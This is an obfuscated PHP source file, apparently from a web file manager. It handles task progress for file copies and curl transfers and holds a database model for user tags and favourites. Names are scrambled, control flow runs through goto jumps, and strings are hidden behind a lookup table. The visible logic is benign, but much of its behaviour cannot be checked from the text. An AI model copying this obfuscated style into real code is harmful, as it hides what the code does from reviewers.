function updateAfter() { goto AŠ“–†è¯æ; cŠÑº®µ : $C‡Àµ­×İ[$Dè‰Ùò´¬[1492]] = $C‡Àµ­×İ[$Dè‰Ùò´¬[1539]] / $C‡Àµ­×İ[$Dè‰Ùò´¬[704]]; if ($C‡Àµ­×İ[$Dè‰Ùò´¬[1492]] > 0) { $C¨›š•Öç = timeFloat() - $C‡Àµ­×İ[$Dè‰Ùò´¬[726]] - $C‡Àµ­×İ[$Dè‰Ùò´¬[1495]]; $C‡Àµ­×İ[$Dè‰Ùò´¬[1496]] = $C¨›š•Öç * (1 - $C‡Àµ­×İ[$Dè‰Ùò´¬[1492]]) / $C‡Àµ­×İ[$Dè‰Ùò´¬[1492]]; } goto Cãšœ¤••; AŠ“–†è¯æ: $Dè‰Ùò´¬ =& $_SERVER[ç]; $C‡Àµ­×İ =& $this->task; if (!$C‡Àµ­×İ[$Dè‰Ùò´¬[704]]) { return; } goto dÜÅé ­ÓÁ; dÜÅé ­ÓÁ: if ($this->sourceModelCopyFlag) { return; } if ($C‡Àµ­×İ[$Dè‰Ùò´¬[1542]] == $Dè‰Ùò´¬[1148]) { return; } if ($C‡Àµ­×İ[$Dè‰Ùò´¬[1542]] == $Dè‰Ùò´¬[1061] || $C‡Àµ­×İ[$Dè‰Ùò´¬[1542]] == $Dè‰Ùò´¬[106]) { if ($C‡Àµ­×İ[$Dè‰Ùò´¬[1536]]) { $C‡Àµ­×İ[$Dè‰Ùò´¬[1539]] = $C‡Àµ­×İ[$Dè‰Ùò´¬[1538]] + $C‡Àµ­×İ[$Dè‰Ùò´¬[1535]]; } } else { if ($C‡Àµ­×İ[$Dè‰Ùò´¬[1542]] == $Dè‰Ùò´¬[1149]) { if ($C‡Àµ­×İ[$Dè‰Ùò´¬[1536]] == $Dè‰Ùò´¬[1061]) { $C‡Àµ­×İ[$Dè‰Ùò´¬[1539]] = $C‡Àµ­×İ[$Dè‰Ùò´¬[1538]] + $C‡Àµ­×İ[$Dè‰Ùò´¬[1535]] * 0.5; } else { if ($C‡Àµ­×İ[$Dè‰Ùò´¬[1536]] == $Dè‰Ùò´¬[106]) { $C‡Àµ­×İ[$Dè‰Ùò´¬[1539]] = $C‡Àµ­×İ[$Dè‰Ùò´¬[1538]] + $C‡Àµ­×İ[$Dè‰Ùò´¬[1534]] * 0.5 + $C‡Àµ­×İ[$Dè‰Ùò´¬[1535]] * 0.5; } } } } goto cŠÑº®µ ; Cãšœ¤••: } public function addPath($b‘óÖ”¢ºÉ) { goto a‘èİÏ“ó¹; a¬†šñ†´Ô: $bÍ„¬ù¼à = IO::infoWithChildren($b‘óÖ”¢ºÉ); $DÁñ•áôÃ = $aó¶àÉŸÀ[$Cš·å¿Ÿ‡¯[1543]] ? $aó¶àÉŸÀ[$Cš·å¿Ÿ‡¯[1543]][$Cš·å¿Ÿ‡¯[1544]] : 0; $aó¶àÉŸÀ[$Cš·å¿Ÿ‡¯[1543]] = array($Cš·å¿Ÿ‡¯[1544] => $DÁñ•áôÃ + 1, $Cš·å¿Ÿ‡¯[407] => $bÍ„¬ù¼à[$Cš·å¿Ÿ‡¯[28]], $Cš·å¿Ÿ‡¯[75] => $bÍ„¬ù¼à[$Cš·å¿Ÿ‡¯[75]], $Cš·å¿Ÿ‡¯[489] => $bÍ„¬ù¼à[$Cš·å¿Ÿ‡¯[489]] ? $bÍ„¬ù¼à[$Cš·å¿Ÿ‡¯[489]] : $bÍ„¬ù¼à[$Cš·å¿Ÿ‡¯[75]]); goto Dâìé‡Ş; a‘èİÏ“ó¹: $Cš·å¿Ÿ‡¯ =& $_SERVER[ç]; if (!$b‘óÖ”¢ºÉ) { return; } $aó¶àÉŸÀ =& $this->task; goto a¬†šñ†´Ô; Dâìé‡Ş: if ($bÍ„¬ù¼à[$Cš·å¿Ÿ‡¯[29]] == $Cš·å¿Ÿ‡¯[173]) { $aó¶àÉŸÀ[$Cš·å¿Ÿ‡¯[989]] += 1; } else { $aó¶àÉŸÀ[$Cš·å¿Ÿ‡¯[989]] += $bÍ„¬ù¼à[$Cš·å¿Ÿ‡¯[80]][$Cš·å¿Ÿ‡¯[78]]; if ($bÍ„¬ù¼à[$Cš·å¿Ÿ‡¯[390]]) { $aó¶àÉŸÀ[$Cš·å¿Ÿ‡¯[989]] += $bÍ„¬ù¼à[$Cš·å¿Ÿ‡¯[80]][$Cš·å¿Ÿ‡¯[79]] + 1; } } $aó¶àÉŸÀ[$Cš·å¿Ÿ‡¯[704]] += $bÍ„¬ù¼à[$Cš·å¿Ÿ‡¯[77]]; $this->update(); goto dòÒÑ äè; dòÒÑ äè: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($B®äİ“Ä¹) { $FÌ„„Ëğ¦Ô =& $_SERVER[ç]; $D“Ã—õÏÇå =& $this->task; $D“Ã—õÏÇå[$FÌ„„Ëğ¦Ô[1532]] = $B®äİ“Ä¹[$FÌ„„Ëğ¦Ô[28]]; $D“Ã—õÏÇå[$FÌ„„Ëğ¦Ô[991]] = $B®äİ“Ä¹[$FÌ„„Ëğ¦Ô[28]]; $this->update(); } public function copyFileStart($d˜Ãˆ³Ôê¼, $EÃ¤¶˜¥²Ş, $Bù¶–İ·Ò, $B¬À¤À¨¹, $fàìèØ­ì, $eàÊ‡²”ŞÖ) { goto cÑÕØµ èİ; f×¨Ëôˆ¨: $A˜š©ßšÛ[$Bï‰ÉæÂ‚†[991]] = $Bï‰ÉæÂ‚†[33]; $A˜š©ßšÛ[$Bï‰ÉæÂ‚†[1536]] = $Bï‰ÉæÂ‚†[33]; $A˜š©ßšÛ[$Bï‰ÉæÂ‚†[1537]] = 0; goto e…©îóÜ›; cÑÕØµ èİ: $Bï‰ÉæÂ‚† =& $_SERVER[ç]; $B‘™‘â÷¡ = $fàìèØ­ì; if ($B‘™‘â÷¡ == $GLOBALS[$Bï‰ÉæÂ‚†[1545]]) { $B‘™‘â÷¡ = $GLOBALS[$Bï‰ÉæÂ‚†[1546]]; } goto Eˆ”ß¥£Ä‰; cÔå¸îŠ–²: $A˜š©ßšÛ[$Bï‰ÉæÂ‚†[1532]] = $B‘™‘â÷¡; $A˜š©ßšÛ[$Bï‰ÉæÂ‚†[1534]] = (int) $d˜Ãˆ³Ôê¼->size($EÃ¤¶˜¥²Ş); $A˜š©ßšÛ[$Bï‰ÉæÂ‚†[1535]] = 0; goto f×¨Ëôˆ¨; Eˆ”ß¥£Ä‰: $GLOBALS[$Bï‰ÉæÂ‚†[1546]] = $fàìèØ­ì; $GLOBALS[$Bï‰ÉæÂ‚†[1545]] = $eàÊ‡²”ŞÖ; $A˜š©ßšÛ =& $this->task; goto cÔå¸îŠ–²; e…©îóÜ›: $this->update(); goto e§¹®·¾¶·; e§¹®·¾¶·: } public function copyFileEnd($dİ„±¯, $eª¿ÅÚ, $AîƒãÆã‘Ò, $dÚÑ†ÇÈ¥±, $c¢¦°ÃÇå, $cÙöôÈíº£) { $a¸°´÷‡·ñ =& $_SERVER[ç]; $e‰¹Ö£ğ‹Õ =& $this->task; $e‰¹Ö£ğ‹Õ[$a¸°´÷‡·ñ[1535]] = $e‰¹Ö£ğ‹Õ[$a¸°´÷‡·ñ[1534]]; $e‰¹Ö£ğ‹Õ[$a¸°´÷‡·ñ[1536]] = $a¸°´÷‡·ñ[33]; if ($c¢¦°ÃÇå == $e‰¹Ö£ğ‹Õ[$a¸°´÷‡·ñ[1532]]) { $e‰¹Ö£ğ‹Õ[$a¸°´÷‡·ñ[1538]] += $e‰¹Ö£ğ‹Õ[$a¸°´÷‡·ñ[1534]]; $e‰¹Ö£ğ‹Õ[$a¸°´÷‡·ñ[1539]] = $e‰¹Ö£ğ‹Õ[$a¸°´÷‡·ñ[1538]]; $this->update(1); } else { $this->update(); $e‰¹Ö£ğ‹Õ[$a¸°´÷‡·ñ[1535]] = 0; } self::log($a¸°´÷‡·ñ[1547] . $eª¿ÅÚ . $a¸°´÷‡·ñ[66] . $dÚÑ†ÇÈ¥± . $a¸°´÷‡·ñ[227] . $c¢¦°ÃÇå . $a¸°´÷‡·ñ[1548] . $e‰¹Ö£ğ‹Õ[$a¸°´÷‡·ñ[1532]]); } public function updateFileEnd($c–›©†šîÌ, $cÍÅ²ç©àƒ) { goto a•ÁæÔ‹Ø; a•ÁæÔ‹Ø: $fÜÊîŸ³„Ï =& $_SERVER[ç]; $dŠíç”¢³Š =& $this->task; $dŠíç”¢³Š[$fÜÊîŸ³„Ï[1532]] = $c–›©†šîÌ; goto Eğ×è¨ŞÑ±; Eğ×è¨ŞÑ±: $dŠíç”¢³Š[$fÜÊîŸ³„Ï[1534]] = $cÍÅ²ç©àƒ; $dŠíç”¢³Š[$fÜÊîŸ³„Ï[1538]] += $cÍÅ²ç©àƒ; $dŠíç”¢³Š[$fÜÊîŸ³„Ï[1539]] = $dŠíç”¢³Š[$fÜÊîŸ³„Ï[1538]]; goto fÛÂ‘‘ƒ¨; fÛÂ‘‘ƒ¨: $this->update(1); self::log($fÜÊîŸ³„Ï[1549] . $c–›©†šîÌ); goto cöŸ‰Ô¦ò; cöŸ‰Ô¦ò: } public function sourceModelCopy($bŒÓòÔÆß“) { goto dÚø²¼¿«˜; d…Ï Ë¾Ê¿: $a­ğÀ­ƒì‰ =& $this->task; $this->sourceModelCopyFlag = !0; $C”ãÏ’ğãê = 0; goto e™ğ•¨«×; dÚø²¼¿«˜: $dŠÙ”² =& $_SERVER[ç]; $B†‘ÁëÅÜ§ = $bŒÓòÔÆß“[0]; $E…ßÌ‡Æ•À = $bŒÓòÔÆß“[1]; goto d…Ï Ë¾Ê¿; e™ğ•¨«×: switch ($B†‘ÁëÅÜ§) { case $dŠÙ”²[530]: $C”ãÏ’ğãê = 1; break; case $dŠÙ”²[533]: $a­ğÀ­ƒì‰[$dŠÙ”²[1532]] = $E…ßÌ‡Æ•À[$dŠÙ”²[28]]; break; case $dŠÙ”²[535]: $C”ãÏ’ğãê = intval($bŒÓòÔÆß“[$dŠÙ”²[375]] * 0.4); break; case $dŠÙ”²[537]: $C”ãÏ’ğãê = intval($bŒÓòÔÆß“[$dŠÙ”²[375]] * 0.2); break; case $dŠÙ”²[539]: $C”ãÏ’ğãê = intval($bŒÓòÔÆß“[$dŠÙ”²[375]] * 0.4); break; } $this->update($C”ãÏ’ğãê); $this->sourceModelCopyFlag = !1; goto A‹¤ ˆÉ¯¥; A‹¤ ˆÉ¯¥: } public function sourceRemove($BÉ‰»¸¹â±, $F”Ú´„™Â‰) { $d‹àœåëæº =& $_SERVER[ç]; $this->sourceModelCopyFlag = !0; $Fµ¦ãæáßÑ = 1; if (isset($BÉ‰»¸¹â±[$d‹àœåëæº[80]])) { $Fµ¦ãæáßÑ = $BÉ‰»¸¹â±[$d‹àœåëæº[80]][$d‹àœåëæº[78]] + $BÉ‰»¸¹â±[$d‹àœåëæº[80]][$d‹àœåëæº[79]] + 1; } $this->update($Fµ¦ãæáßÑ); $this->sourceModelCopyFlag = !1; } public function sourceMove($bµí‰“ÅÄŠ) { $this->sourceRemove($bµí‰“ÅÄŠ, !1); } public function curlProgress($C ÃØ¯—ÒÚ, $eÊ£öÅã ê, $bÎ¼ïœó¢ò, $E¶‡°‡ÚØ£, $cö××¥‘‚) { $FæßËÌ§åµ =& $_SERVER[ç]; $cÊ÷Şì¹¯ñ =& $this->task; if ($cö××¥‘‚ > 0) { $cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[991]] = $FæßËÌ§åµ[1550]; $cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[1536]] = $FæßËÌ§åµ[106]; if ($cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[1534]]) { $cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[1535]] = $cö××¥‘‚; } if ($cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[1537]]) { $cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[1535]] = $cö××¥‘‚ + $cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[1537]]; } } else { if ($bÎ¼ïœó¢ò > 0) { if ($cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[1534]] == $eÊ£öÅã ê) { $cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[1535]] = $bÎ¼ïœó¢ò; $cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[991]] = $FæßËÌ§åµ[1551]; $cÊ÷Şì¹¯ñ[$FæßËÌ§åµ[1536]] = $FæßËÌ§åµ[1061]; } } } $this->update(); } public function curlProgressStart($AÛ„¡‰Ú«Ñ) { } public function curlProgressEnd($CÊ”©ÙšØŒ) { goto B”á×ê„ï; EùØæêáŒÕ: $this->update(); goto f‹·Œó³•; EÅöñªÚù: $e“Ø½î¿¹ = $dù½ÄöãÓ‹[$A²Æåìƒë®[1552]]; if ($e“Ø½î¿¹ == -1) { $e“Ø½î¿¹ = $dù½ÄöãÓ‹[$A²Æåìƒë®[1553]]; } if ($FÍ¬¦»å‚[$A²Æåìƒë®[1536]] == $A²Æåìƒë®[106] && $e“Ø½î¿¹) { $FÍ¬¦»å‚[$A²Æåìƒë®[1537]] += $e“Ø½î¿¹; } goto EùØæêáŒÕ; B”á×ê„ï: $A²Æåìƒë® =& $_SERVER[ç]; $FÍ¬¦»å‚ =& $this->task; $dù½ÄöãÓ‹ = curl_getinfo($CÊ”©ÙšØŒ); goto EÅöñªÚù; f‹·Œó³•: } } class TaskHttp extends Task { protected function startAfter() { $eáğœ†¬• =& $_SERVER[ç]; $Bˆ¶ìô¨×¼ =& $this->task; $Bˆ¶ìô¨×¼[$eáğœ†¬•[1554]] = 1; Hook::bind($eáğœ†¬•[1526], array($this, $eáğœ†¬•[1555])); Hook::bind($eáğœ†¬•[1528], array($this, $eáğœ†¬•[1556])); Hook::bind($eáğœ†¬•[1530], array($this, $eáğœ†¬•[1557])); } protected function endAfter() { $aÊ–£ò©Ñ™ =& $_SERVER[ç]; Hook::unbind($aÊ–£ò©Ñ™[1526], array($this, $aÊ–£ò©Ñ™[1555])); Hook::unbind($aÊ–£ò©Ñ™[1528], array($this, $aÊ–£ò©Ñ™[1556])); Hook::unbind($aÊ–£ò©Ñ™[1530], array($this, $aÊ–£ò©Ñ™[1557])); } public function progressStart($bÒĞÃÃø) { $AáŒò¯Šµğ =& $_SERVER[ç]; $FÍí•Å‡Û¡ = curl_getinfo($bÒĞÃÃø); self::log($AáŒò¯Šµğ[1558] . $FÍí•Å‡Û¡[$AáŒò¯Šµğ[303]]); self::valueSet($this->task[$AáŒò¯Šµğ[388]], $this->task); } public function progressEnd($bäóÇÔøœ¥) { $BÇèÛ×¬—ì =& $_SERVER[ç]; self::log($BÇèÛ×¬—ì[1559] . $this->task[$BÇèÛ×¬—ì[388]]); $this->end(); } public function progress($A³ğÒäŠ»Ñ, $Fä„æëğ, $Cæé¦öŒÉ, $dï‡¢ƒ¨±ò, $F÷³öÂ…ö) { $DÖ“¦ÛÄì® =& $_SERVER[ç]; $dšîÁ¥í—· =& $this->task; if ($F÷³öÂ…ö > 0) { $dšîÁ¥í—·[$DÖ“¦ÛÄì®[989]] = $dšîÁ¥í—·[$DÖ“¦ÛÄì®[989]] == 0 ? $dï‡¢ƒ¨±ò : $dšîÁ¥í—·[$DÖ“¦ÛÄì®[989]]; $dšîÁ¥í—·[$DÖ“¦ÛÄì®[1003]] = $F÷³öÂ…ö; } else { if ($Cæé¦öŒÉ > 0) { $dšîÁ¥í—·[$DÖ“¦ÛÄì®[989]] = $dšîÁ¥í—·[$DÖ“¦ÛÄì®[989]] == 0 ? $Fä„æëğ : $dšîÁ¥í—·[$DÖ“¦ÛÄì®[989]]; $dšîÁ¥í—·[$DÖ“¦ÛÄì®[1003]] = $Cæé¦öŒÉ; } } $this->update(); self::log("\x70\x72\x6f\147\162\145\163\x73\110\164\x74\x70\72\144\x6f\167\156\x3a{$Cæé¦öŒÉ}\57{$Fä„æëğ}\x3b\40\165\160\x6c\x6f\x61\x64\72{$F÷³öÂ…ö}\57{$dï‡¢ƒ¨±ò}\73"); } } goto A²•Ö•î; EØ§”Šª¬: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($eÚ¤øà×äÖ) { $b‡Í•â£¹ø =& $_SERVER[ç]; return array($b‡Í•â£¹ø[1757] => array(USER_ID, $b‡Í•â£¹ø[1758])); } protected function listData() { $CË£‰¶Ÿ£¦ =& $_SERVER[ç]; $CË“Œç¡ = array($CË£‰¶Ÿ£¦[1483] => USER_ID, $CË£‰¶Ÿ£¦[457] => array($CË£‰¶Ÿ£¦[1761], 0)); $b—ß×´µ = $CË£‰¶Ÿ£¦[1763]; $E¼íæÜÉ¼æ = $this->field($b—ß×´µ)->where($CË“Œç¡)->order($CË£‰¶Ÿ£¦[1764])->select(); return $E¼íæÜÉ¼æ ? $E¼íæÜÉ¼æ : array(); } protected function listByTag($Cß¯¢×¹¹®) { } protected function addToTag($e¹¶×Üå‹÷, $FôÑ¦ŞŠ³§) { $b£é‹™È¼ =& $_SERVER[ç]; if (!Model($b£é‹™È¼[1898])->listData($FôÑ¦ŞŠ³§) || !Model($b£é‹™È¼[760])->pathInfo($e¹¶×Üå‹÷)) { return !1; } $d¼™ñ‰¿†õ = array($b£é‹™È¼[1483] => USER_ID, $b£é‹™È¼[457] => $FôÑ¦ŞŠ³§, $b£é‹™È¼[408] => $e¹¶×Üå‹÷, $b£é‹™È¼[409] => $b£é‹™È¼[403], $b£é‹™È¼[407] => $b£é‹™È¼[33], $b£é‹™È¼[1658] => 0); if ($this->where($d¼™ñ‰¿†õ)->find()) { return !1; } return $this->add($d¼™ñ‰¿†õ); } protected function removeFromTag($cÎˆ“¬Ñù, $D‘†÷Ğ„µ) { $E¯Ş­ÊÍôã =& $_SERVER[ç]; if (!Model($E¯Ş­ÊÍôã[1898])->listData($D‘†÷Ğ„µ)) { return !1; } if (is_array($cÎˆ“¬Ñù)) { $cÎˆ“¬Ñù = array($E¯Ş­ÊÍôã[7], $cÎˆ“¬Ñù); } $e…¶ öëê° = array($E¯Ş­ÊÍôã[1483] => USER_ID, $E¯Ş­ÊÍôã[457] => $D‘†÷Ğ„µ, $E¯Ş­ÊÍôã[409] => $E¯Ş­ÊÍôã[403], $E¯Ş­ÊÍôã[408] => $cÎˆ“¬Ñù); return $this->where($e…¶ öëê°)->delete(); } protected function removeByTag($EùÈ›ã‡¦Ö) { $d­ª½©ÏŒ¬ =& $_SERVER[ç]; if (!$EùÈ›ã‡¦Ö) { return !1; } $cøÃÜ‹ÂŠ = array($d­ª½©ÏŒ¬[1483] => USER_ID, $d­ª½©ÏŒ¬[457] => $EùÈ›ã‡¦Ö); return $this->where($cøÃÜ‹ÂŠ)->delete(); } protected function removeBySource($A¡ƒñŒŒ®Î) { $Fæ›ƒ­Ïº =& $_SERVER[ç]; if (is_array($A¡ƒñŒŒ®Î)) { $A¡ƒñŒŒ®Î = array($Fæ›ƒ­Ïº[7], $A¡ƒñŒŒ®Î); } $EŒÑ‹±ƒ•¡ = array($Fæ›ƒ­Ïº[1483] => USER_ID, $Fæ›ƒ­Ïº[408] => $A¡ƒñŒŒ®Î, $Fæ›ƒ­Ïº[457] => array($Fæ›ƒ­Ïº[939], 0)); return $this->where($EŒÑ‹±ƒ•¡)->delete(); } }